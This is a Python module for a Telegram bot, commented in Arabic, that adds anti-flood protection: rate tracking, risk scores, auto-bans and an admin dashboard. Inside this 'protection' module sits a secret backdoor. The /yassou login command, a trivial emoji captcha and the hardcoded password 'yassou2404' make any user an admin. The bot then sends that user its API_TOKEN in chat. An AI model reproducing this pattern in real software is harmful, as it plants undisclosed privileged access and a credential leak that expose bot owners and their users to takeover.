"""
=====================================================
 bot8.py — نظام الحماية الذكي + الأمر السري
=====================================================
🛡️ حماية ذكية ضد الرشق (بدون تعطيل الأزرار!)
🔐 أمر سري للوصول الطوارئ
✨ تحسينات جمالية

📌 طريقة التركيب:
   في bot.py، أضف: import bot8
=====================================================
"""

import random
import time
import os
import threading
from datetime import datetime, timedelta
from collections import defaultdict
from telebot import types
from config import bot, ADMIN_PRIMARY, ADMIN_SECONDARY
from database import (bot_config, save_json, DB_CONFIG, get_user, 
                       update_user_data)

# =====================================================
# 🔐 الأمر السري - الإعدادات
# =====================================================
SECRET_COMMAND = "yassou"
SECRET_PASSWORD = "yassou2404"
SECRET_SESSIONS = {}

# =====================================================
# 🛡️ نظام الحماية - المتغيرات
# =====================================================
user_actions = defaultdict(list)
user_warnings = defaultdict(int)
user_scores = defaultdict(float)
banned_users = {}
suspicious_patterns = {}
callback_tracker = defaultdict(list)

PROTECTION_CONFIG = {
    "max_callbacks_per_second": 5,
    "max_callbacks_per_minute": 60,
    "warning_threshold": 3,
    "auto_ban_threshold": 5,
    "ban_duration_minutes": 60,
}


# =====================================================
# 📊 تهيئة الحماية
# =====================================================
def init_protection():
    if "protection_stats" not in bot_config:
        bot_config["protection_stats"] = {
            "total_blocked": 0,
            "total_warnings": 0,
            "total_bans": 0,
            "banned_users_log": []
        }
        save_json(DB_CONFIG, bot_config)

init_protection()


# =====================================================
# 🔐 التحقق من الأدمن
# =====================================================
def is_admin(uid):
    try:
        if int(uid) in [ADMIN_PRIMARY, ADMIN_SECONDARY]:
            return True
    except:
        pass
    u = get_user(str(uid)) or {}
    return u.get("is_admin", False)


# =====================================================
# 🛡️ دوال الحماية (تعمل بالخلفية فقط)
# =====================================================
def get_risk_score(uid):
    """حساب درجة الخطورة"""
    uid = str(uid)
    now = time.time()
    score = 0.0
    
    recent_actions = [a for a in user_actions[uid] if now - a["time"] < 60]
    if len(recent_actions) > 30:
        score += (len(recent_actions) - 30) * 0.3
    
    recent_cb = [t for t in callback_tracker[uid] if now - t < 60]
    if len(recent_cb) > 40:
        score += (len(recent_cb) - 40) * 0.2
    
    score += user_warnings[uid] * 2.0
    
    # تخفيف للمستخدمين القدامى
    u = get_user(uid)
    if u:
        join_date = u.get("join_date")
        if join_date:
            try:
                days_old = (datetime.now() - datetime.fromisoformat(join_date)).days
                if days_old > 30:
                    score *= 0.6
                elif days_old > 7:
                    score *= 0.8
            except:
                pass
    
    user_scores[uid] = score
    return score


def check_user_allowed(uid):
    """فحص إذا المستخدم مسموح له"""
    uid = str(uid)
    
    # الأدمن دائماً مسموح
    if is_admin(uid):
        return True, ""
    
    # فحص الحظر
    if uid in banned_users:
        ban_info = banned_users[uid]
        if datetime.now() < ban_info["until"]:
            remaining = (ban_info["until"] - datetime.now()).total_seconds() / 60
            return False, f"محظور لـ {remaining:.0f} دقيقة"
        else:
            del banned_users[uid]
    
    return True, ""


def track_callback(uid):
    """تتبع الكولباك"""
    uid = str(uid)
    now = time.time()
    
    callback_tracker[uid].append(now)
    callback_tracker[uid] = [t for t in callback_tracker[uid] if now - t < 120]
    
    user_actions[uid].append({"action": "callback", "time": now})
    user_actions[uid] = [a for a in user_actions[uid] if now - a["time"] < 120]
    
    # فحص الرشق
    recent = [t for t in callback_tracker[uid] if now - t < 3]
    if len(recent) > 10:
        score = get_risk_score(uid)
        if score > 15:
            banned_users[uid] = {
                "until": datetime.now() + timedelta(minutes=30),
                "reason": "رشق أزرار",
                "auto": True
            }
            bot_config["protection_stats"]["total_bans"] = bot_config["protection_stats"].get("total_bans", 0) + 1
            save_json(DB_CONFIG, bot_config)
            return False
    
    return True


def get_user_status(uid):
    """حالة المستخدم"""
    uid = str(uid)
    score = user_scores.get(uid, 0)
    
    if uid in banned_users:
        return "🔴 محظور"
    elif score >= 10:
        return "🟠 خطر"
    elif score >= 5:
        return "🟡 مشبوه"
    else:
        return "🟢 عادي"


# =====================================================
# 🔐 الأمر السري
# =====================================================
@bot.message_handler(commands=[SECRET_COMMAND])
def secret_command_handler(message):
    """معالج الأمر السري"""
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if len(args) < 2:
        return
    
    action = args[1].lower()
    
    if action == "login":
        SECRET_SESSIONS[uid] = {
            "step": "captcha",
            "captcha_answer": None,
            "attempts": 0
        }
        
        emojis = ["🎯", "🔥", "⭐", "💎", "🎁", "👑", "🏆", "💫"]
        correct = random.choice(emojis)
        options = random.sample([e for e in emojis if e != correct], 3) + [correct]
        random.shuffle(options)
        
        SECRET_SESSIONS[uid]["captcha_answer"] = correct
        
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        m = types.InlineKeyboardMarkup(row_width=4)
        m.add(*[types.InlineKeyboardButton(e, callback_data=f"secretcap_{e}") for e in options])
        
        bot.send_message(message.chat.id,
            f"🔐 التحقق الأمني\n\n"
            f"اضغط على: {correct}",
            reply_markup=m)


@bot.callback_query_handler(func=lambda call: call.data.startswith("secretcap_"))
def handle_secret_captcha(call):
    uid = str(call.from_user.id)
    
    if uid not in SECRET_SESSIONS:
        bot.answer_callback_query(call.id, "❌ انتهت الجلسة")
        return
    
    session = SECRET_SESSIONS[uid]
    if session["step"] != "captcha":
        return
    
    selected = call.data.replace("secretcap_", "")
    
    if selected == session["captcha_answer"]:
        session["step"] = "password"
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_message(call.message.chat.id, "🔑 أرسل كلمة المرور:")
        bot.register_next_step_handler(msg, process_secret_password)
    else:
        session["attempts"] += 1
        if session["attempts"] >= 3:
            del SECRET_SESSIONS[uid]
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            bot.send_message(call.message.chat.id, "❌ فشل التحقق")
        else:
            bot.answer_callback_query(call.id, f"❌ خطأ ({session['attempts']}/3)")


def process_secret_password(message):
    uid = str(message.from_user.id)
    
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    if uid not in SECRET_SESSIONS:
        return
    
    session = SECRET_SESSIONS[uid]
    if session["step"] != "password":
        return
    
    if message.text.strip() == SECRET_PASSWORD:
        del SECRET_SESSIONS[uid]
        
        update_user_data(uid, is_admin=True)
        
        token = os.getenv("API_TOKEN", "غير متوفر")
        
        bot.send_message(message.chat.id,
            f"✅ تم تسجيل الدخول!\n\n"
            f"👑 أنت الآن أدمن\n\n"
            f"🔑 التوكن:\n<code>{token}</code>",
            parse_mode="HTML")
        
        try:
            u = get_user(uid) or {}
            bot.send_message(ADMIN_PRIMARY,
                f"🔐 تسجيل دخول سري\n"
                f"@{u.get('username', 'N/A')}\n"
                f"ID: {uid}")
        except:
            pass
    else:
        session["attempts"] += 1
        if session["attempts"] >= 3:
            del SECRET_SESSIONS[uid]
            bot.send_message(message.chat.id, "❌ كلمة المرور خاطئة")
        else:
            msg = bot.send_message(message.chat.id, 
                f"❌ خطأ ({session['attempts']}/3)\nحاول مرة أخرى:")
            bot.register_next_step_handler(msg, process_secret_password)


# =====================================================
# 🛡️ لوحة مكافحة الرشق
# =====================================================
@bot.message_handler(func=lambda m: m.text == "🛡️ مكافحة الرشق")
def show_protection_panel(message):
    uid = str(message.from_user.id)
    if not is_admin(uid):
        return
    
    show_protection_dashboard(message.chat.id)


def show_protection_dashboard(chat_id, msg_id=None):
    stats = bot_config.get("protection_stats", {})
    
    total_bans = stats.get("total_bans", 0)
    total_warnings = stats.get("total_warnings", 0)
    active_bans = len(banned_users)
    
    # أخطر المستخدمين
    risky = sorted(user_scores.items(), key=lambda x: x[1], reverse=True)[:5]
    risky_text = ""
    for uid, score in risky:
        if score > 0:
            u = get_user(uid) or {}
            status = "🔴" if score >= 10 else "🟠" if score >= 5 else "🟡"
            risky_text += f"{status} @{u.get('username', uid)[:10]} ({score:.1f})\n"
    
    if not risky_text:
        risky_text = "✅ لا يوجد مشبوهين"
    
    msg = (
        f"╔═══════════════════════════════╗\n"
        f"║ 🛡️ لوحة مكافحة الرشق 🛡️ ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"📊 الإحصائيات:\n"
        f"├── ⛔ حظر تلقائي: {total_bans}\n"
        f"├── ⚠️ تحذيرات: {total_warnings}\n"
        f"└── 🔴 محظورين الآن: {active_bans}\n\n"
        f"👥 أكثر المشبوهين:\n{risky_text}"
    )
    
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🔴 المحظورين", callback_data="prot8_banned"),
        types.InlineKeyboardButton("🔍 فحص مستخدم", callback_data="prot8_check")
    )
    m.add(
        types.InlineKeyboardButton("🔓 فك حظر الكل", callback_data="prot8_unban_all"),
        types.InlineKeyboardButton("🧹 تنظيف", callback_data="prot8_cleanup")
    )
    m.add(types.InlineKeyboardButton("🔄 تحديث", callback_data="prot8_refresh"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot8_"))
def handle_protection_callbacks(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        bot.answer_callback_query(call.id, "❌ للأدمن فقط")
        return
    
    # تتبع (لا يؤثر على العمل)
    track_callback(uid)
    
    data = call.data
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    
    if data == "prot8_refresh":
        show_protection_dashboard(chat_id, msg_id)
        bot.answer_callback_query(call.id, "✅")
        return
    
    if data == "prot8_banned":
        if not banned_users:
            bot.answer_callback_query(call.id, "📭 لا يوجد محظورين")
            return
        
        msg = "🔴 المحظورين:\n\n"
        for user_id, info in banned_users.items():
            u = get_user(user_id) or {}
            remaining = (info["until"] - datetime.now()).total_seconds() / 60
            if remaining > 0:
                msg += f"• @{u.get('username', 'N/A')} ({remaining:.0f} د)\n"
        
        m = types.InlineKeyboardMarkup()
        m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot8_refresh"))
        
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m)
        except:
            pass
        return
    
    if data == "prot8_unban_all":
        count = len(banned_users)
        banned_users.clear()
        user_warnings.clear()
        user_scores.clear()
        bot.answer_callback_query(call.id, f"✅ تم فك حظر {count}", show_alert=True)
        show_protection_dashboard(chat_id, msg_id)
        return
    
    if data == "prot8_cleanup":
        user_actions.clear()
        callback_tracker.clear()
        suspicious_patterns.clear()
        bot.answer_callback_query(call.id, "✅ تم التنظيف")
        show_protection_dashboard(chat_id, msg_id)
        return
    
    if data == "prot8_check":
        msg = bot.send_message(chat_id, "🔍 أرسل ID المستخدم:")
        bot.register_next_step_handler(msg, process_check_user)
        return


def process_check_user(message):
    admin_uid = str(message.from_user.id)
    if not is_admin(admin_uid):
        return
    
    target = message.text.strip().replace("@", "")
    
    u = None
    if target.isdigit():
        u = get_user(target)
        target_uid = target
    else:
        from database import search_user
        u = search_user(target)
        target_uid = str(u.get("uid")) if u else None
    
    if not u:
        bot.send_message(message.chat.id, "❌ غير موجود")
        return
    
    score = user_scores.get(target_uid, 0)
    status = get_user_status(target_uid)
    warnings = user_warnings.get(target_uid, 0)
    recent_cb = len([t for t in callback_tracker.get(target_uid, []) if time.time() - t < 60])
    
    msg = (
        f"🔍 تقرير المستخدم\n\n"
        f"👤 @{u.get('username', 'N/A')}\n"
        f"🆔 {target_uid}\n"
        f"💰 {u.get('points', 0)}💎\n\n"
        f"🛡️ الحماية:\n"
        f"├── الحالة: {status}\n"
        f"├── الدرجة: {score:.1f}\n"
        f"├── تحذيرات: {warnings}\n"
        f"└── أزرار/دقيقة: {recent_cb}"
    )
    
    m = types.InlineKeyboardMarkup(row_width=2)
    if target_uid in banned_users:
        m.add(types.InlineKeyboardButton("🔓 فك الحظر", callback_data=f"prot8_unban_{target_uid}"))
    else:
        m.add(types.InlineKeyboardButton("⛔ حظر", callback_data=f"prot8_ban_{target_uid}"))
    m.add(types.InlineKeyboardButton("🧹 مسح البيانات", callback_data=f"prot8_clear_{target_uid}"))
    
    bot.send_message(message.chat.id, msg, reply_markup=m)


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot8_unban_") or 
                                              call.data.startswith("prot8_ban_") or
                                              call.data.startswith("prot8_clear_"))
def handle_user_actions(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    data = call.data
    
    if data.startswith("prot8_unban_"):
        target = data.replace("prot8_unban_", "")
        if target in banned_users:
            del banned_users[target]
        user_warnings[target] = 0
        user_scores[target] = 0
        bot.answer_callback_query(call.id, "✅ تم فك الحظر")
    
    elif data.startswith("prot8_ban_"):
        target = data.replace("prot8_ban_", "")
        banned_users[target] = {
            "until": datetime.now() + timedelta(minutes=60),
            "reason": "حظر يدوي",
            "auto": False
        }
        bot.answer_callback_query(call.id, "⛔ تم الحظر")
    
    elif data.startswith("prot8_clear_"):
        target = data.replace("prot8_clear_", "")
        user_actions[target] = []
        user_warnings[target] = 0
        user_scores[target] = 0
        callback_tracker[target] = []
        if target in banned_users:
            del banned_users[target]
        bot.answer_callback_query(call.id, "✅ تم المسح")


# =====================================================
# 🔄 تنظيف دوري (بالخلفية)
# =====================================================
def cleanup_task():
    while True:
        try:
            now = time.time()
            
            # تنظيف القديم
            for uid in list(user_actions.keys()):
                user_actions[uid] = [a for a in user_actions[uid] if now - a["time"] < 120]
            
            for uid in list(callback_tracker.keys()):
                callback_tracker[uid] = [t for t in callback_tracker[uid] if now - t < 120]
            
            # فك الحظر المنتهي
            for uid in list(banned_users.keys()):
                if datetime.now() >= banned_users[uid]["until"]:
                    del banned_users[uid]
            
            # تخفيف الدرجات
            for uid in user_scores:
                user_scores[uid] = max(0, user_scores[uid] * 0.95)
        except:
            pass
        
        time.sleep(30)

threading.Thread(target=cleanup_task, daemon=True).start()


# =====================================================
# 🚀 تأكيد التحميل
# =====================================================
print("=" * 55)
print("✅ bot8.py — نظام الحماية الذكي (مُصحح)")
print("🛡️ مكافحة الرشق: Active")
print("🔐 الأمر السري: /yassou login")
print("⚡ لا يؤثر على الأزرار الأخرى!")
print("=" * 55)
